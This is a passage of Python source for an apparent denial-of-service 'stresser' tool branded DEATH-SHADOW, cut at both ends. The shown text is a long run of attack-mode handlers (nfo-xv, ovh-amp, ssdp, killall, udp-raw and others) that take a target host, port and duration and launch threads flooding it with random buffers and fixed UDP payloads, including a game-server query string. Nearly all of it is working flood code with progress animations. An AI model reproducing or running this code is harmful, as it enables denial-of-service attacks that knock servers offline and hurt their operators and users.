					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo-down":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo-null":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo-ovh":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-nat":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-amp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo-crush":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-down":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-tcp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-stresser":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-sas":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-rape":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo-rape":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-raw":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
